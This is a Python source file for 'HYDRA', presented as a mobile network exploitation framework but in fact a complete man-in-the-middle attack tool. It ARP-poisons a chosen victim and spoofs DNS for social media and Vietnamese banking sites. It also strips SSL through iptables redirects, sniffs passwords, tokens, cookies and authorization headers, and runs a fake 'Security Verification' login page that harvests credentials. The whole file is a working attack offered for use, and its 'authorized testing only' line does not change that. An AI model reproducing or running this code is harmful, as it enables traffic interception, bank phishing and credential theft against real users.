#!/usr/bin/env python3
"""
HYDRA v1.0 - Advanced 4G/5G Mobile Network Exploitation Framework
Professional Mobile Network Security Testing & Intelligence Gathering

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: sudo python3 hydra.py -i eth0
"""

import sys
import os
import re
import json
import time
import socket
import threading
import subprocess
import signal
import base64
import hashlib
import random
import ssl
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from collections import defaultdict
from urllib.parse import urlparse, urljoin, parse_qs
import requests

from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import ARP, Ether
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.http import HTTP, HTTPRequest
from scapy.layers.dhcp import DHCP

# ==================== VERSION ====================
VERSION = "1.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

# ==================== COLOR CODES ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

# ==================== BANNER ====================
def print_banner():
    banner = f"""
{Colors.PURPLE}{Colors.BOLD}     ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
    ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
    ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
    ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
    ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
    ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                                   
{Colors.GREEN}          MOBILE NETWORK EXPLOITATION FRAMEWORK{Colors.WHITE}
{Colors.CYAN}    Advanced 4G/5G Security Testing & Intelligence{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 70)

# ==================== UTILITY FUNCTIONS ====================
class Utilities:
    @staticmethod
    def timestamp() -> str:
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_default_gateway() -> str:
        try:
            result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
            if result.stdout:
                match = re.search(r'default via ([\d.]+)', result.stdout)
                if match:
                    return match.group(1)
        except:
            pass
        return None
    
    @staticmethod
    def get_network_range(ip: str) -> str:
        parts = ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    
    @staticmethod
    def scan_network(ip_range: str) -> List[str]:
        """Scan network for active devices"""
        devices = []
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), 
                         timeout=3, verbose=False)
            for sent, received in ans:
                devices.append({
                    'ip': received.psrc,
                    'mac': received.hwsrc
                })
        except:
            pass
        return devices

# ==================== ARP SPOOFING ENGINE ====================
class ARPSpoofEngine:
    def __init__(self, interface: str, target_ip: str, gateway_ip: str):
        self.interface = interface
        self.target = target_ip
        self.gateway = gateway_ip
        self.running = False
        self.stop_event = threading.Event()
        self.stats = {'packets_sent': 0}
        
        self.target_mac = self._get_mac(target_ip)
        self.gateway_mac = self._get_mac(gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            cprint("[!] Could not resolve MAC addresses", Colors.RED)
            sys.exit(1)
        
        cprint("[+] Target MAC: {}".format(self.target_mac), Colors.DIM)
        cprint("[+] Gateway MAC: {}".format(self.gateway_mac), Colors.DIM)
        
        self._enable_ip_forward()
    
    def _get_mac(self, ip: str) -> Optional[str]:
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                         timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None
    
    def _enable_ip_forward(self):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        cprint("[+] IP forwarding enabled", Colors.DIM)
    
    def start(self):
        cprint("[ARP] Poisoning {} -> {}".format(self.target, self.gateway), Colors.YELLOW)
        self.running = True
        
        while self.running and not self.stop_event.is_set():
            send(ARP(op=2, pdst=self.target, hwdst=self.target_mac, psrc=self.gateway), 
                 verbose=False)
            send(ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, psrc=self.target), 
                 verbose=False)
            self.stats['packets_sent'] += 2
            time.sleep(1)
    
    def stop(self):
        cprint("[ARP] Restoring network...", Colors.YELLOW)
        self.running = False
        self.stop_event.set()
        
        send(ARP(op=2, pdst=self.target, hwdst=self.target_mac, 
                 psrc=self.gateway, hwsrc=self.gateway_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, 
                 psrc=self.target, hwsrc=self.target_mac), count=5, verbose=False)
        
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
        
        cprint("[+] Network restored", Colors.GREEN)

# ==================== DNS SPOOFING ENGINE ====================
class DNSSpoofEngine:
    def __init__(self, interface: str, redirect_ip: str):
        self.interface = interface
        self.redirect_ip = redirect_ip
        self.running = False
        self.stop_event = threading.Event()
        self.spoof_map = {}
        self.stats = {'responses_sent': 0}
        self._load_default_spoofs()
    
    def _load_default_spoofs(self):
        targets = [
            'facebook.com', 'www.facebook.com',
            'google.com', 'www.google.com',
            'youtube.com', 'www.youtube.com',
            'instagram.com', 'www.instagram.com',
            'tiktok.com', 'www.tiktok.com',
            'twitter.com', 'www.twitter.com',
            'whatsapp.com', 'www.whatsapp.com',
            'telegram.org', 'www.telegram.org',
            'zalo.me', 'www.zalo.me',
            'vietcombank.com.vn', 'www.vietcombank.com.vn',
            'techcombank.com.vn', 'www.techcombank.com.vn',
            'bidv.com.vn', 'www.bidv.com.vn',
            'mbbank.com.vn', 'www.mbbank.com.vn',
            'vpbank.com.vn', 'www.vpbank.com.vn'
        ]
        for domain in targets:
            self.spoof_map[domain] = self.redirect_ip
    
    def add_spoof(self, domain: str, redirect_ip: str):
        self.spoof_map[domain] = redirect_ip
        cprint("[DNS] Spoofing {} -> {}".format(domain, redirect_ip), Colors.DIM)
    
    def start(self):
        cprint("[DNS] Starting DNS spoofing (redirect: {})".format(self.redirect_ip), Colors.YELLOW)
        cprint("[DNS] Spoofing {} domains".format(len(self.spoof_map)), Colors.DIM)
        self.running = True
        
        def packet_handler(pkt):
            if not self.running:
                return
            
            if pkt.haslayer(DNS) and pkt.haslayer(IP) and pkt.haslayer(UDP):
                if pkt[DNS].qr == 0:
                    if pkt[DNS].qd:
                        qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                        
                        for domain, redirect_ip in self.spoof_map.items():
                            if domain in qname or qname in domain:
                                ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                                udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                                dns = DNS(
                                    id=pkt[DNS].id,
                                    qr=1,
                                    aa=1,
                                    qd=pkt[DNS].qd,
                                    an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=redirect_ip)
                                )
                                send(ip/udp/dns, verbose=False)
                                self.stats['responses_sent'] += 1
                                cprint("[DNS] Redirected {} -> {}".format(qname, redirect_ip), Colors.GREEN)
                                break
        
        sniff(iface=self.interface, filter="port 53", prn=packet_handler, 
              store=0, stop_filter=lambda x: self.stop_event.is_set())
    
    def stop(self):
        cprint("[DNS] Stopping DNS spoofing...", Colors.YELLOW)
        self.running = False
        self.stop_event.set()
        cprint("[+] DNS spoofing stopped", Colors.GREEN)

# ==================== SSL STRIPPING ENGINE ====================
class SSLStripEngine:
    def __init__(self, interface: str, port: int = 10000):
        self.interface = interface
        self.port = port
        self.running = False
        self.process = None
        self.stats = {'connections': 0}
    
    def start(self):
        cprint("[SSL] Starting SSL stripping on port {}".format(self.port), Colors.YELLOW)
        
        try:
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-p", "tcp", "--dport", "80", "-j", "REDIRECT",
                "--to-port", str(self.port)
            ], check=False)
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-p", "tcp", "--dport", "443", "-j", "REDIRECT",
                "--to-port", str(self.port)
            ], check=False)
            
            try:
                self.process = subprocess.Popen(
                    ["sslstrip", "-l", str(self.port), "-a", "-w", "sslstrip.log"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                cprint("[+] SSL stripping started", Colors.GREEN)
                self.running = True
            except:
                cprint("[!] sslstrip not found. Using fallback", Colors.YELLOW)
                self._fallback_server()
                
        except Exception as e:
            cprint("[-] SSL strip failed: {}".format(e), Colors.RED)
    
    def _fallback_server(self):
        import http.server
        
        class StripHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b"""
                <html>
                <head><title>SSL Strip Active</title></head>
                <body>
                    <h1>SSL Strip Active</h1>
                    <p>All traffic is being intercepted for security testing.</p>
                </body>
                </html>
                """)
        
        server = http.server.HTTPServer(('0.0.0.0', self.port), StripHandler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        cprint("[+] Fallback HTTP server started", Colors.GREEN)
        self.running = True
    
    def stop(self):
        cprint("[SSL] Stopping SSL stripping...", Colors.YELLOW)
        self.running = False
        
        if self.process:
            self.process.terminate()
        
        subprocess.run(["iptables", "-t", "nat", "--flush"], check=False)
        cprint("[+] SSL stripping stopped", Colors.GREEN)

# ==================== TRAFFIC ANALYZER ====================
class TrafficAnalyzer:
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.stop_event = threading.Event()
        self.credentials = []
        self.cookies = []
        self.urls = []
        self.images = []
        self.devices = {}
        self.stats = {'packets': 0, 'credentials': 0, 'cookies': 0}
        self.lock = threading.Lock()
    
    def start(self):
        cprint("[ANALYZE] Starting traffic analysis...", Colors.BLUE)
        self.running = True
        
        def packet_handler(pkt):
            if not self.running:
                return
            
            with self.lock:
                self.stats['packets'] += 1
            
            if pkt.haslayer(HTTPRequest):
                self._analyze_http(pkt)
            
            if pkt.haslayer(Raw):
                self._extract_credentials(pkt)
            
            if pkt.haslayer(DHCP):
                self._detect_device(pkt)
        
        sniff(iface=self.interface, prn=packet_handler, 
              store=0, stop_filter=lambda x: self.stop_event.is_set())
    
    def _analyze_http(self, pkt):
        try:
            http = pkt[HTTPRequest]
            host = http.Host.decode() if http.Host else 'unknown'
            path = http.Path.decode() if http.Path else '/'
            method = http.Method.decode() if http.Method else 'GET'
            
            full_url = "http://{}{}".format(host, path)
            
            with self.lock:
                self.urls.append({
                    'timestamp': Utilities.timestamp(),
                    'url': full_url,
                    'method': method,
                    'host': host
                })
            
            cprint("[HTTP] {} {}".format(method, full_url), Colors.DIM)
            
            # Check for login forms
            if 'login' in path.lower() or 'auth' in path.lower():
                cprint("[!] Login page detected: {}".format(full_url), Colors.YELLOW)
            
            # Extract cookies
            if http.Cookie:
                cookie_str = http.Cookie.decode()
                with self.lock:
                    self.cookies.append({
                        'timestamp': Utilities.timestamp(),
                        'url': full_url,
                        'cookie': cookie_str
                    })
                    self.stats['cookies'] += 1
                cprint("[COOKIE] {} -> {}".format(host, cookie_str[:50]), Colors.GREEN)
                
        except Exception as e:
            pass
    
    def _extract_credentials(self, pkt):
        try:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # Look for username/password patterns
            patterns = [
                (r'username[=:]\s*([^\s&]+)', 'username'),
                (r'user[=:]\s*([^\s&]+)', 'username'),
                (r'email[=:]\s*([^\s&]+)', 'email'),
                (r'password[=:]\s*([^\s&]+)', 'password'),
                (r'pass[=:]\s*([^\s&]+)', 'password'),
                (r'pwd[=:]\s*([^\s&]+)', 'password'),
                (r'token[=:]\s*([^\s&]+)', 'token'),
                (r'api_key[=:]\s*([^\s&]+)', 'api_key'),
                (r'auth[=:]\s*([^\s&]+)', 'auth')
            ]
            
            found = False
            for pattern, cred_type in patterns:
                matches = re.findall(pattern, payload, re.IGNORECASE)
                for match in matches:
                    if len(match) > 2:
                        with self.lock:
                            self.credentials.append({
                                'timestamp': Utilities.timestamp(),
                                'type': cred_type,
                                'value': match
                            })
                            self.stats['credentials'] += 1
                        cprint("[CREDENTIAL] {}: {}".format(cred_type, match), Colors.RED)
                        found = True
            
            # Extract authorization headers
            if 'Authorization:' in payload:
                auth_match = re.search(r'Authorization:\s*([^\r\n]+)', payload, re.IGNORECASE)
                if auth_match:
                    with self.lock:
                        self.credentials.append({
                            'timestamp': Utilities.timestamp(),
                            'type': 'authorization',
                            'value': auth_match.group(1)
                        })
                        self.stats['credentials'] += 1
                    cprint("[AUTH] {}".format(auth_match.group(1)[:50]), Colors.RED)
                    
        except:
            pass
    
    def _detect_device(self, pkt):
        try:
            for opt in pkt[DHCP].options:
                if opt[0] == 'hostname' and opt[1]:
                    hostname = opt[1].decode('utf-8', errors='ignore')
                    mac = pkt[Ether].src if pkt.haslayer(Ether) else 'unknown'
                    ip = pkt[IP].src if pkt.haslayer(IP) else 'unknown'
                    
                    if ip not in self.devices:
                        self.devices[ip] = {
                            'ip': ip,
                            'mac': mac,
                            'hostname': hostname,
                            'first_seen': Utilities.timestamp(),
                            'last_seen': Utilities.timestamp()
                        }
                        cprint("[DEVICE] {} ({}) - {}".format(ip, mac, hostname), Colors.CYAN)
                    break
        except:
            pass
    
    def get_stats(self) -> Dict:
        with self.lock:
            return {
                'packets': self.stats['packets'],
                'credentials': self.stats['credentials'],
                'cookies': self.stats['cookies'],
                'urls': len(self.urls),
                'devices': len(self.devices)
            }
    
    def get_credentials(self) -> List:
        with self.lock:
            return self.credentials.copy()
    
    def get_cookies(self) -> List:
        with self.lock:
            return self.cookies.copy()
    
    def get_urls(self) -> List:
        with self.lock:
            return self.urls.copy()
    
    def get_devices(self) -> Dict:
        with self.lock:
            return self.devices.copy()
    
    def stop(self):
        cprint("[ANALYZE] Stopping traffic analysis...", Colors.YELLOW)
        self.running = False
        self.stop_event.set()
        cprint("[+] Traffic analysis stopped", Colors.GREEN)

# ==================== WEB SERVER (Phishing) ====================
class PhishingServer:
    def __init__(self, port: int = 80):
        self.port = port
        self.running = False
        self.server = None
        self.captured = []
    
    def start(self):
        cprint("[PHISHING] Starting phishing server on port {}".format(self.port), Colors.YELLOW)
        import http.server
        
        class PhishingHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self._handle_request()
            
            def do_POST(self):
                self._handle_request()
            
            def _handle_request(self):
                content = """
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Service Update Required</title>
                    <style>
                        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
                        h2 { text-align: center; color: #333; }
                        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
                        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
                        button:hover { background: #0069d9; }
                        .logo { text-align: center; font-size: 48px; margin-bottom: 20px; }
                        .alert { background: #fff3cd; color: #856404; padding: 12px; border-radius: 4px; margin-bottom: 15px; border: 1px solid #ffc107; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="logo">HYDRA</div>
                        <h2>Security Verification Required</h2>
                        <div class="alert">Your session has expired. Please re-enter your credentials.</div>
                        <form method="POST" action="/capture">
                            <input type="text" name="username" placeholder="Username / Email" required>
                            <input type="password" name="password" placeholder="Password" required>
                            <button type="submit">Verify Identity</button>
                        </form>
                    </div>
                </body>
                </html>
                """
                
                if self.path == '/capture':
                    content_length = int(self.headers.get('Content-Length', 0))
                    if content_length > 0:
                        body = self.rfile.read(content_length).decode()
                        data = parse_qs(body)
                        captured = {
                            'timestamp': Utilities.timestamp(),
                            'ip': self.client_address[0],
                            'username': data.get('username', [''])[0],
                            'password': data.get('password', [''])[0]
                        }
                        self.server.captured.append(captured)
                        cprint("[PHISHING] Credentials captured: {}:{}".format(
                            captured['username'], captured['password']), Colors.RED, bold=True)
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b"""
                    <html>
                    <head><title>Verified</title></head>
                    <body>
                        <h1>Verification Successful</h1>
                        <p>Your identity has been verified. You will be redirected shortly.</p>
                        <script>setTimeout(function(){ window.location.href = "https://www.google.com"; }, 2000);</script>
                    </body>
                    </html>
                    """)
                else:
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(content.encode())
        
        self.server = http.server.HTTPServer(('0.0.0.0', self.port), PhishingHandler)
        self.running = True
        
        thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        thread.start()
        cprint("[+] Phishing server running on port {}".format(self.port), Colors.GREEN)
    
    def stop(self):
        cprint("[PHISHING] Stopping phishing server...", Colors.YELLOW)
        self.running = False
        if self.server:
            self.server.shutdown()
        cprint("[+] Phishing server stopped", Colors.GREEN)
    
    def get_captured(self) -> List:
        return self.captured

# ==================== MAIN FRAMEWORK ====================
class Hydra:
    def __init__(self, interface: str):
        self.interface = interface
        self.target_ip = None
        self.gateway_ip = None
        self.arp_engine = None
        self.dns_engine = None
        self.ssl_engine = None
        self.analyzer = None
        self.phishing = None
        self.running = False
        self.components = []
    
    def discover_network(self):
        cprint("\n[DISCOVER] Scanning network...", Colors.BLUE)
        
        self.gateway_ip = Utilities.get_default_gateway()
        if not self.gateway_ip:
            cprint("[-] Could not find gateway", Colors.RED)
            return False
        
        local_ip = Utilities.get_local_ip()
        network_range = Utilities.get_network_range(local_ip)
        
        cprint("[+] Gateway: {}".format(self.gateway_ip), Colors.GREEN)
        cprint("[+] Local IP: {}".format(local_ip), Colors.GREEN)
        cprint("[+] Network: {}".format(network_range), Colors.GREEN)
        
        devices = Utilities.scan_network(network_range)
        cprint("[+] Found {} active devices".format(len(devices)), Colors.GREEN)
        
        for device in devices:
            if device['ip'] != local_ip and device['ip'] != self.gateway_ip:
                cprint("    {} - {}".format(device['ip'], device['mac']), Colors.DIM)
        
        return True
    
    def select_target(self):
        target = input("\n[>] Enter target IP: ").strip()
        if not target:
            cprint("[-] Invalid target", Colors.RED)
            return False
        
        self.target_ip = target
        cprint("[+] Target selected: {}".format(target), Colors.GREEN)
        return True
    
    def start_attack(self):
        if not self.target_ip or not self.gateway_ip:
            cprint("[-] Target or gateway not set", Colors.RED)
            return
        
        cprint("\n[ATTACK] Starting attack on {}".format(self.target_ip), Colors.RED, bold=True)
        
        self.components = []
        
        # Start ARP spoofing
        self.arp_engine = ARPSpoofEngine(self.interface, self.target_ip, self.gateway_ip)
        arp_thread = threading.Thread(target=self.arp_engine.start, daemon=True)
        arp_thread.start()
        self.components.append(('ARP Spoofing', self.arp_engine))
        time.sleep(1)
        
        # Start DNS spoofing
        local_ip = Utilities.get_local_ip()
        self.dns_engine = DNSSpoofEngine(self.interface, local_ip)
        dns_thread = threading.Thread(target=self.dns_engine.start, daemon=True)
        dns_thread.start()
        self.components.append(('DNS Spoofing', self.dns_engine))
        time.sleep(1)
        
        # Start SSL stripping
        self.ssl_engine = SSLStripEngine(self.interface)
        ssl_thread = threading.Thread(target=self.ssl_engine.start, daemon=True)
        ssl_thread.start()
        self.components.append(('SSL Stripping', self.ssl_engine))
        time.sleep(1)
        
        # Start traffic analysis
        self.analyzer = TrafficAnalyzer(self.interface)
        analyzer_thread = threading.Thread(target=self.analyzer.start, daemon=True)
        analyzer_thread.start()
        self.components.append(('Traffic Analysis', self.analyzer))
        time.sleep(1)
        
        # Start phishing server
        self.phishing = PhishingServer()
        phishing_thread = threading.Thread(target=self.phishing.start, daemon=True)
        phishing_thread.start()
        self.components.append(('Phishing', self.phishing))
        
        self.running = True
        cprint("\n[+] All components started", Colors.GREEN, bold=True)
        cprint("[*] Press Ctrl+C to stop\n", Colors.DIM)
    
    def show_status(self):
        if not self.analyzer:
            cprint("[!] Attack not started", Colors.YELLOW)
            return
        
        stats = self.analyzer.get_stats()
        
        print("\n" + "="*70)
        cprint(" ATTACK STATUS", Colors.PURPLE, bold=True)
        print("="*70)
        print("Target          : {}".format(self.target_ip))
        print("Gateway         : {}".format(self.gateway_ip))
        print("Uptime          : {}s".format(int(time.time() - self.start_time) if hasattr(self, 'start_time') else 0))
        print("-"*70)
        cprint("Traffic Stats:", Colors.YELLOW)
        print("  Packets        : {}".format(stats['packets']))
        print("  Credentials    : {}".format(stats['credentials']))
        print("  Cookies        : {}".format(stats['cookies']))
        print("  URLs           : {}".format(stats['urls']))
        print("  Devices        : {}".format(stats['devices']))
        
        if self.phishing:
            captured = self.phishing.get_captured()
            if captured:
                print("-"*70)
                cprint("Captured Credentials:", Colors.RED)
                for cred in captured[-5:]:
                    print("  {}:{}".format(cred['username'], cred['password']))
        
        if self.analyzer and self.analyzer.credentials:
            print("-"*70)
            cprint("Extracted Credentials:", Colors.RED)
            for cred in self.analyzer.credentials[-5:]:
                print("  {}: {}".format(cred['type'], cred['value']))
        
        print("="*70)
    
    def show_devices(self):
        if not self.analyzer:
            cprint("[!] Attack not started", Colors.YELLOW)
            return
        
        devices = self.analyzer.get_devices()
        if not devices:
            cprint("[!] No devices detected", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" DETECTED DEVICES", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"{'IP':<16} {'MAC':<20} {'Hostname':<20}")
        print("-"*60)
        for ip, info in devices.items():
            print("{} {} {}".format(
                ip.ljust(16),
                info.get('mac', 'unknown').ljust(20),
                info.get('hostname', 'unknown')[:20]
            ))
        print("="*60)
    
    def show_credentials(self):
        if not self.analyzer:
            cprint("[!] Attack not started", Colors.YELLOW)
            return
        
        credentials = self.analyzer.get_credentials()
        if not credentials:
            cprint("[!] No credentials captured", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" CAPTURED CREDENTIALS", Colors.RED, bold=True)
        print("="*60)
        for cred in credentials:
            print("{}: {}".format(cred['type'], cred['value']))
        print("="*60)
    
    def show_cookies(self):
        if not self.analyzer:
            cprint("[!] Attack not started", Colors.YELLOW)
            return
        
        cookies = self.analyzer.get_cookies()
        if not cookies:
            cprint("[!] No cookies captured", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" CAPTURED COOKIES", Colors.YELLOW, bold=True)
        print("="*60)
        for cookie in cookies[-10:]:
            print("{}: {}".format(cookie['url'], cookie['cookie'][:100]))
        print("="*60)
    
    def show_urls(self):
        if not self.analyzer:
            cprint("[!] Attack not started", Colors.YELLOW)
            return
        
        urls = self.analyzer.get_urls()
        if not urls:
            cprint("[!] No URLs captured", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" CAPTURED URLS", Colors.CYAN, bold=True)
        print("="*60)
        for url in urls[-20:]:
            print("[{}] {}".format(url['method'], url['url']))
        print("="*60)
    
    def export_results(self):
        if not self.analyzer:
            cprint("[!] Attack not started", Colors.YELLOW)
            return
        
        data = {
            'timestamp': Utilities.timestamp(),
            'target': self.target_ip,
            'gateway': self.gateway_ip,
            'credentials': self.analyzer.get_credentials(),
            'cookies': self.analyzer.get_cookies(),
            'urls': self.analyzer.get_urls(),
            'devices': self.analyzer.get_devices(),
            'phishing': self.phishing.get_captured() if self.phishing else [],
            'stats': self.analyzer.get_stats()
        }
        
        filename = "hydra_export_{}.json".format(int(time.time()))
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        cprint("[+] Results exported to {}".format(filename), Colors.GREEN)
    
    def stop_attack(self):
        cprint("\n[STOP] Stopping all components...", Colors.YELLOW)
        
        for name, engine in self.components:
            try:
                if hasattr(engine, 'stop'):
                    engine.stop()
                cprint("[+] {} stopped".format(name), Colors.GREEN)
            except Exception as e:
                cprint("[-] {} stop error: {}".format(name, e), Colors.RED)
        
        self.running = False
        cprint("[+] Attack stopped", Colors.GREEN)
    
    def run_menu(self):
        self.start_time = time.time()
        
        while True:
            print(f"\n{Colors.BLUE}{'='*60}{Colors.WHITE}")
            print(f"{Colors.BOLD}HYDRA - Mobile Network Exploitation{Colors.WHITE}")
            print(f"{Colors.BLUE}{'='*60}{Colors.WHITE}")
            print("1. Discover Network")
            print("2. Select Target")
            print("3. Start Attack")
            print("4. Show Status")
            print("5. Show Devices")
            print("6. Show Credentials")
            print("7. Show Cookies")
            print("8. Show URLs")
            print("9. Export Results")
            print("10. Stop Attack")
            print("11. Exit")
            
            choice = input(f"\n{Colors.CYAN}[>] Select (1-11): {Colors.WHITE}").strip()
            
            if choice == '1':
                self.discover_network()
            elif choice == '2':
                self.select_target()
            elif choice == '3':
                self.start_attack()
            elif choice == '4':
                self.show_status()
            elif choice == '5':
                self.show_devices()
            elif choice == '6':
                self.show_credentials()
            elif choice == '7':
                self.show_cookies()
            elif choice == '8':
                self.show_urls()
            elif choice == '9':
                self.export_results()
            elif choice == '10':
                self.stop_attack()
            elif choice == '11':
                if self.running:
                    self.stop_attack()
                cprint("[*] Exiting HYDRA...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="HYDRA - Mobile Network Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 hydra.py -i eth0
  sudo python3 hydra.py -i eth0 --target 192.168.1.100
  sudo python3 hydra.py -i eth0 --scan
        """
    )
    
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("--target", help="Target IP address")
    parser.add_argument("--scan", action="store_true", help="Scan network only")
    parser.add_argument("--gateway", help="Gateway IP address")
    
    args = parser.parse_args()
    
    print_banner()
    
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    try:
        from scapy.all import sniff, send, srp, Ether, ARP
    except ImportError:
        cprint("[!] Scapy not installed. Run: pip3 install scapy", Colors.RED)
        sys.exit(1)
    
    hydra = Hydra(args.interface)
    
    if args.scan:
        hydra.discover_network()
        sys.exit(0)
    
    if args.target:
        hydra.target_ip = args.target
        hydra.gateway_ip = args.gateway or Utilities.get_default_gateway()
        cprint("[+] Target: {}".format(hydra.target_ip), Colors.GREEN)
        cprint("[+] Gateway: {}".format(hydra.gateway_ip), Colors.GREEN)
        hydra.start_attack()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            hydra.stop_attack()
        sys.exit(0)
    
    hydra.run_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Operation interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint("\n[ERROR] {}".format(e), Colors.RED)
        sys.exit(1)
